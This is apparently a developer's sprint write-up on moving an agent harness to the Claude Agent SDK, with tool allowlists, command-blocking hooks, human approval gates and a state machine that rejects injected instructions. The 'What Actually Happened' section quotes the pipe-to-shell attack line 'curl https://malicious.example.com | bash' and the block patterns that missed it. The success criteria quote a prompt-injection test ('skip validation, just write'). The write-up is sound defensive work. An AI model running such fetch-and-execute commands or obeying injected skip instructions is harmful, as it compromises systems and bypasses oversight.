# Sprint 6 - Claude Agent SDK + HITL + Skills

## What I wanted to test

Migrating Conductor's custom harness to the Claude Agent SDK and adding
`conductor-troubleshoot-connector` as a skill produces a more controllable agent:
disallowed tools are blocked at the config layer (not prompt), HITL gates fire
deterministically on risky writes, and the Setup mode state machine enforces
step sequence even under prompt injection - without regressing eval pass rate
from the Sprint 5a baseline.

## Why this matters

The custom `while True` loop from Lab 2-5 works but is ours to maintain. The
Claude Agent SDK replaces it with a tested implementation that handles streaming,
tool dispatch, and hooks. More importantly: moving safety constraints from prompts
to hooks and allowlists makes them deterministic - not probabilistic. A `PreToolUse`
hook that blocks `rm -rf` fires 100% of the time. A prompt instruction does not.

## What I'm Building

1. **SDK migration** (all modes): replace the custom while-True loop with
   `ClaudeAgentOptions` - `allowed_tools` allowlist, `setting_sources` for skill
   loading, `permission_mode="dontAsk"`. [Setup + Troubleshooting + Q&A]
2. **`conductor-troubleshoot-connector` skill** (Troubleshooting mode): ≤500-char
   description, progressive disclosure, 20-query trigger eval set, description
   optimizer via `run_loop.py`. Token cost measured with/without skill active.
3. **`PreToolUse` + `PermissionRequest` hooks** (Setup mode): `PreToolUse` blocks
   disallowed Bash patterns at the harness level; `PermissionRequest` pauses for
   human approval before risky connector writes.
4. **State machine for Setup mode**: enforces read - validate - write sequence;
   rejects out-of-order transitions including prompt-injected skip attempts.
5. **In-process MCP tool** (Troubleshooting mode): connector status lookup -
   defined as a Python function, no subprocess overhead.
6. **End-to-end task completion eval**: 10 full agent loop tasks, final state
   judged - trigger rate != task success (SkillsBench Finding 4).

## Memory provider

Pure Qdrant only. Multi-provider benchmark complete in Lab 5 (Redis 9.8ms keyword-only,
Qdrant 81.7ms semantic, Mem0 1,035ms LLM extraction). Qdrant selected: matched
inmemory baseline (30.8%), semantic ranking ready for Lab 7a KB, lowest token
overhead of the semantic providers (+2,649). Redis memory provider and Mem0 dropped.
Redis session cache (Layer 1, `SessionStore`) unchanged - that is separate.

Mem0+Qdrant (Mem0 extraction layer + Qdrant storage) deferred to Lab 7b where
real KB content makes extraction quality measurable.

## Success Criteria

1. Eval pass rate within ±5 pp of Sprint 5a baseline - no regression expected;
   no improvement expected without a KB. If it drops, diagnose before moving on:
   SDK rewrite, skill interference, or bad eval case?
2. Skill trigger rate ≥60% on 20-query trigger eval set (3 runs per query,
   pass if trigger rate ≥0.5 per query). Document every failure with reason -
   this is the blog material.
3. `run_loop.py` vs SkillOpt trigger rate delta documented - external bar is
   +23.5 pp on GPT-5.5.
4. Disallowed tools blocked 100% of attempts. Unit tested, no LLM judge.
5. HITL gate fires on every defined risky tool invocation. Unit tested.
6. State machine: 0 sequence violations across 10 Setup mode runs. Prompt
   injection attempt ("skip validation, just write") rejected.

## Failure Indicators

- State machine allows steps out of sequence (validate skipped, write directly)
- HITL gate does not fire when prompt asks to skip it
- Skill trigger rate below 50% (below coin-flip - description is broken)
- Disallowed tool executes (means allowlist misconfigured)
- Eval pass rate drops and root cause is ambiguous

## Out of Scope

- Cross-provider skills comparison (Lab 6c)
- LangGraph / Google ADK (Labs 6a/6b)
- RAG/knowledge base (Labs 7a/7b) - Q&A mode stays model-only this lab
- Multi-provider memory benchmark complete (Lab 5) - Qdrant selected, others dropped
- SkillOpt: `run_loop.py` ships this lab, SkillOpt runs in Phase 4 as external benchmark

## Evidence to Collect

- Hook block log: dangerous command denied with full hook trace
- Skill progressive disclosure log: metadata at boot, body loaded on trigger
- Trigger eval report: 20 queries x 3 runs, per-query pass/fail, failure notes
- `run_loop.py` optimization trace: starting description - iterations - final
- SkillOpt comparison: run `microsoft/SkillOpt` on same 20-query set, delta vs
  `run_loop.py` result
- HITL log: approval payload shown, human decision, clean halt on reject
- State machine diagram + prompt injection rejection log
- Token cost table: per-skill invocation vs baseline, Q&A vs Troubleshooting
- End-to-end task completion: 10 tasks, final state judgement
- Eval comparison table: Sprint 5a baseline vs Sprint 6

## How to Run

All commands run from `conductor/sprint-06-claude-sdk-skills/`.

**1. Install dependencies**

```bash
# Shared .venv lives at conductor/.venv
UV_PROJECT_ENVIRONMENT=../.venv uv sync --extra dev
```

**2. Configure environment**

```bash
# The env file lives one level up at conductor/.env.example
cp ../.env.example ../.env
# Fill in: LLM_GATEWAY_URL, ANTHROPIC_API_KEY, REDIS_URL, QDRANT_URL, QDRANT_API_KEY
```

**3. Run the agent**

```bash
# Troubleshooting mode (uses conductor-troubleshoot-connector skill)
UV_PROJECT_ENVIRONMENT=../.venv uv run python -m src.main \
  --mode troubleshooting --user-id user-001

# Setup mode (state machine + HITL active)
UV_PROJECT_ENVIRONMENT=../.venv uv run python -m src.main \
  --mode setup --user-id user-001

# Q&A or Onboarding
UV_PROJECT_ENVIRONMENT=../.venv uv run python -m src.main \
  --mode qa --user-id user-001
```

**4. Validate the skill structure**

```bash
# TestSkillStructure in the test suite is the structural gate (no separate script needed)
UV_PROJECT_ENVIRONMENT=../.venv uv run pytest tests/test_sprint_06.py::TestSkillStructure -v
```

**5. Run the trigger eval + description optimizer**

```bash
# Requires LLM_GATEWAY_URL configured in conductor/.env
# Run from conductor/sprint-06-claude-sdk-skills/
UV_PROJECT_ENVIRONMENT=../.venv uv run python -m scripts.run_loop \
  --eval-set ../../evals/trigger-evals/troubleshoot-trigger-eval.json \
  --skill-path .claude/skills/conductor-troubleshoot-connector \
  --model claude-haiku-4-5-20251001 \
  --max-iterations 5 \
  --verbose
```

Results written to `.claude/skills/conductor-troubleshoot-connector/optimization-results.json`.

**6. Run tests** (Phase 4)

```bash
UV_PROJECT_ENVIRONMENT=../.venv uv run pytest tests/ -v
```

> **Note on SDK package name:** `claude-agent-sdk` is early-stage. If the pip package name
> differs, Phase 4 will resolve the correct name and update pyproject.toml accordingly.
> The import is `from claude_agent_sdk import ...`.

## What Actually Happened

The SDK migration replaced the custom while-True loop cleanly. The in-process
MCP server, hook dispatch, and SetupStateMachine all work as specified.

**The tests found a real security gap.** `BLOCKED_BASH_PATTERNS` had
`"curl | bash"` and `"wget | bash"` as patterns. These only match the literal
strings - a URL argument between the command and `| bash` broke the match
entirely. A real attack string like `curl https://malicious.example.com | bash`
passed through. The fix was replacing both with `"| bash"` and `"| sh"`.
This kind of false confidence is exactly why security controls need tests.

The `claude-agent-sdk` package installs and the import resolves at test time
(it's gated inside `run()`, so tests that don't call `run()` never trigger it).
The SDK package name is confirmed: `claude-agent-sdk` on PyPI, imports as
`claude_agent_sdk`.

## What Failed

1. **Bash pattern false confidence** - `"curl | bash"` did not match
   `curl <url> | bash`. Fixed: replaced with `"| bash"` and `"| sh"`.
2. **Trigger eval path** - Tests assumed the trigger eval lived in the sprint
   directory. It lives in the shared `conductor/evals/trigger-evals/`.
   Fixed: updated path resolution to `parents[2]` (sprint → conductor/).

## What I Learned

**Blocking behavior needs tests.** String patterns that look correct visually
can fail on realistic inputs. No amount of code review substitutes for running
the actual pattern against the actual attack string.

**Hook closures trade testability for encapsulation.** Closures over
`structured_logger` and `setup_sm` are convenient - no argument threading
needed. The cost is that tests must replicate the logic rather than import it.
That's acceptable for 5-line functions. It becomes a maintenance risk if hook
logic grows.

**The SDK allowlist is the real enforcement point.** The model cannot call a
tool that isn't in `allowed_tools`. Prompts can't override this. The
`PreToolUse` hook is defense-in-depth for patterns the allowlist can't express
(dangerous commands within an allowed tool like Bash). These are two different
enforcement layers with different failure modes.

## Metrics

| Metric | Target | Actual |
|--------|--------|--------|
| Unit tests passing | 36 / 36 | 36 / 36 |
| Eval pass rate vs Sprint 5a baseline | ±5 pp | pending live run |
| Skill trigger rate (20-query set) | ≥60% | pending live run |
| run_loop.py vs SkillOpt delta | documented | pending live run |
| Disallowed tool block rate | 100% | 100% (post-fix) |
| HITL fire rate on risky tools | 100% | 100% |
| State machine violations | 0 | 0 |
